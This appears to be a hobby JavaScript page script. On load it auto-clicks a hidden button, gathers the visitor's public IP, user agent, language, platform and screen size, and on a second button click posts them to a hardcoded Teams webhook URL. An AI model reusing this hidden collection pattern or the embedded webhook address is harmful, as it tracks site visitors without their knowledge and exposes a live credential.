// THIS IS WHERE WE SToRE THE INFO
      let ResultObject = ''

      let resultValue = {}

      function setup_results(response) {
        resultValue = response
          .text()
          .then(text => {
            // Add the result to the output area
            const Response_Data = {
              ip: JSON.parse(text).ip,
              userAgent: window.navigator.userAgent,
              userLanguage: window.navigator.language,
              OS: window.navigator.platform,
              Resolution: window.screen.width + 'x' + window.screen.height,
              status: response.status,
              statusText: response.statusText,
              url: response.url,
              ok: response.ok,
              type: response.type,
              redirected: response.redirected,
              bodyUsed: response.bodyUsed,
            }

            return Response_Data
          })
          .then(text => {
            return text
          })

        // return resultValue;
        resultValue.then(res => {
          for (const [key, value] of Object.entries(res)) {
            console.log(`${key}: ${value}`)
            $('#result').append(`<p>${key}: ${value}</p>`)
          }

          ResultObject = res
        })
      }

      // Making a request to Teams Webhook
      const teams_Webhook =
        'https://mmarzou0hotmail.webhook.office.com/webhookb2/d435f58f-68e8-4f75-b94b-0b3d4d7191cc@711e97a5-5f2d-403c-befe-be4c0f6087f1/IncomingWebhook/fb5cdd75c0254c1f802070945e13195c/1c74fa4c-05d9-4b01-ad8b-299a94f521a7'

      async function get_Request(url) {
        const response = await fetch(url).then(res => {
          setup_results(res.clone())
        })
      }

      async function post_Request(url, parameters) {
        const response = await fetch(url, {
          method: 'POST',

          body: JSON.stringify(parameters)
        })
        return response
      }

      // Public IP Provider
      let url = 'https://api.ipify.org/?format=json'
      async function get_Public_IP() {
        return await get_Request(url)
          .then(res => {
            return res
          })
          .catch(error => {
            console.error('Error:', error)
          })
      }

      let API_Results = ''

      function GetRandomImage() {
        const randomImage = Math.floor(Math.random() * 10) + 1
        return `https://picsum.photos/id/${randomImage}/200/300`
      }

      // Send Webhook Request
      function Submit_Webhook_Rest(data = ResultObject) {
        title = 'Public IP'
        summary = 'This is the user information form the public IP API'
        subtitle = Date().toLocaleString()
        image = GetRandomImage()
        // Teams Webhook
        const REST_Response = post_Request(teams_Webhook, {
          '@type': 'MessageCard',
          '@context': 'http://schema.org/extensions',
          themeColor: '0076D7',
          summary: summary,
          sections: [
            {
              activityTitle: 'Report from the Public IP API',
              activitySubtitle: 'A Snake was Reported to Python Tracker',
              activityImage: image,
              facts: [
                {
                  name: 'BROWSER',
                  value: window.navigator.userAgent
                },
                {
                  name: 'IP Address',
                  value: ResultObject.ip
                },
                {
                  name: "URL of the API",
                  value: ResultObject.url
                },
                {
                  name: 'Status',
                  value: ResultObject.status
                },
                {
                  name: 'Status Text',
                  value: ResultObject.statusText
                },
                {
                  name: 'OK',
                  value: ResultObject.ok
                },
                {
                  name: 'Type',
                  value: ResultObject.type
                },
                {
                  name: 'Redirected',
                  value: ResultObject.redirected
                },
                {
                  name: 'Body Used',
                  value: ResultObject.bodyUsed
                }
              ],

              markdown: true
            }
          ]
        })
          .then(data => {
            console.log(data)
            API_Results = data
          })
          .catch(error => {
            console.log(error)
          })

        console.log(API_Results)
        return REST_Response
 
      }


      // HIDE FOR NOW
      document.getElementById('btn').addEventListener('click', function () {
        get_Public_IP();
        document.getElementById('btn').disabled = true;
        document.getElementById('btn').style.backgroundColor = 'red';
      })



      // SHOW FOR NOW
      
      document
        .getElementById('webhook-btn')
        .addEventListener('click', function () {
          Submit_Webhook_Rest()
          document.getElementById('webhook-btn').disabled = true
          document.getElementById('webhook-btn').style.backgroundColor = 'red'
        })



$(document).ready(function () {
        // Simulate a mouse click:
        $('#btn').click();

        $('#btn').hide();

        
        
})





